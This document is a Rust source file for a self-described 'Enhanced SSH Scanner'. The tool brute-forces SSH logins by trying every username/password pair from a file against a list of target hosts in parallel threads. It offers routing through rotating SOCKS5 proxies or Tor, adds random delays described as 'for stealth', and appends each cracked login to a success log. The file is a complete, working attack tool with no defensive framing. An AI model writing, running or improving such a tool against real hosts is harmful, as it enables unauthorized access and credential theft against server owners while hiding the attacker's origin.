use ssh2::Session;
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::net::{TcpStream, SocketAddr};
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use clap::Parser;
use indicatif::{ProgressBar, ProgressStyle};
use socks::Socks5Stream;
use colored::*;
use dialoguer::{theme::ColorfulTheme, Select};
use rand::Rng;

/// Command-line argument structure
#[derive(Parser)]
#[command(version = "1.2", author = "YourName")]
struct Args {
    #[arg(short, long)]
    targets: String,

    #[arg(long)]
    userpass: String,

    #[arg(long)]
    proxy: Option<String>,

    #[arg(long)]
    tor: bool,

    #[arg(short, long)]
    verbose: bool,
}

/// Read lines from a file
fn read_lines(filename: &str) -> io::Result<Vec<String>> {
    let file = File::open(Path::new(filename))?;
    let reader = io::BufReader::new(file);
    Ok(reader.lines().filter_map(|line| line.ok()).collect())
}

/// Attempt SSH login using direct connection
fn attempt_ssh(ip: &str, username: &str, password: &str, verbose: bool) -> bool {
    let addr = format!("{}:22", ip);
    if let Ok(tcp) = TcpStream::connect_timeout(&addr.parse().unwrap(), Duration::new(5, 0)) {
        let mut session = Session::new().unwrap();
        session.set_tcp_stream(tcp);
        if session.handshake().is_ok() && session.userauth_password(username, password).is_ok() {
            if verbose {
                println!("{}", format!("[SUCCESS] {}:{}@{}", username, password, ip).green());
            }
            return true;
        }
    }
    false
}

/// Attempt SSH login using proxy
fn attempt_ssh_with_proxy(proxy: &str, ip: &str, username: &str, password: &str, verbose: bool) -> bool {
    let proxy_addr: SocketAddr = proxy.parse().expect("Invalid proxy address");
    if let Ok(mut stream) = Socks5Stream::connect(proxy_addr, format!("{}:22", ip).as_str()) {
        let mut session = Session::new().unwrap();
        session.set_tcp_stream(stream.get_mut().try_clone().unwrap());
        if session.handshake().is_ok() && session.userauth_password(username, password).is_ok() {
            if verbose {
                println!("{}", format!("[PROXY SUCCESS] {}:{}@{}", username, password, ip).cyan());
            }
            return true;
        }
    }
    false
}

/// Attempt SSH login using TOR
fn attempt_ssh_with_tor(ip: &str, username: &str, password: &str, verbose: bool) -> bool {
    let tor_proxy = "127.0.0.1:9050";
    if let Ok(mut stream) = Socks5Stream::connect(tor_proxy, format!("{}:22", ip).as_str()) {
        let mut session = Session::new().unwrap();
        session.set_tcp_stream(stream.get_mut().try_clone().unwrap());
        if session.handshake().is_ok() && session.userauth_password(username, password).is_ok() {
            if verbose {
                println!("{}", format!("[TOR SUCCESS] {}:{}@{}", username, password, ip).purple());
            }
            return true;
        }
    }
    false
}

/// Main function with interactive UI and scanning logic
fn main() {
    let args = Args::parse();

    // Read targets and userpass pairs
    let targets = read_lines(&args.targets).expect("Failed to read targets file");
    let userpass_pairs = read_lines(&args.userpass).expect("Failed to read userpass file");

    // Load proxies if specified
    let proxies = if let Some(proxy_file) = &args.proxy {
        Some(read_lines(proxy_file).expect("Failed to read proxy file"))
    } else {
        None
    };

    // Beautified Interactive Menu
    println!("{}", "Welcome to the Enhanced SSH Scanner 🚀".bold().blue());
    let modes = &["Direct Connection", "External Proxy", "TOR Network"];
    let mode_selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Choose your scanning mode")
        .default(0)
        .items(modes)
        .interact()
        .unwrap();

    // Determine scanning mode
    let use_tor = args.tor || mode_selection == 2;
    let use_proxy = proxies.is_some() && mode_selection == 1;

    let total_attempts = targets.len() * userpass_pairs.len();
    let pb = ProgressBar::new(total_attempts as u64);
    pb.set_style(ProgressStyle::with_template("{bar:40} {pos}/{len} [ETA: {eta}]").unwrap());

    let success_count = Arc::new(Mutex::new(0));
    let mut handles = vec![];

    for ip in &targets {
        let ip = ip.clone();
        let userpass_pairs = userpass_pairs.clone();
        let success_count = Arc::clone(&success_count);
        let pb = pb.clone();
        let verbose = args.verbose;
        let proxies = proxies.clone();

        let handle = thread::spawn(move || {
            let mut rng = rand::thread_rng();
            for pair in userpass_pairs {
                let parts: Vec<&str> = pair.split_whitespace().collect();
                if parts.len() != 2 {
                    continue;
                }
                let username = parts[0];
                let password = parts[1];

                let success = if use_tor {
                    attempt_ssh_with_tor(&ip, username, password, verbose)
                } else if use_proxy {
                    let proxy_list = proxies.as_ref().unwrap();
                    let proxy = &proxy_list[rng.gen_range(0..proxy_list.len())];
                    attempt_ssh_with_proxy(proxy, &ip, username, password, verbose)
                } else {
                    attempt_ssh(&ip, username, password, verbose)
                };

                if success {
                    let mut count = success_count.lock().unwrap();
                    *count += 1;
                    let mut file = File::options().append(true).create(true).open("ssh_success.log").unwrap();
                    writeln!(file, "{}:{}@{}", username, password, ip).unwrap();
                }

                pb.inc(1);

                // Random delay for stealth
                let delay = rng.gen_range(500..1500);
                thread::sleep(Duration::from_millis(delay));
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }

    pb.finish();
    println!("{}", format!("Total Successful SSH Logins: {}", *success_count.lock().unwrap()).green().bold());
}

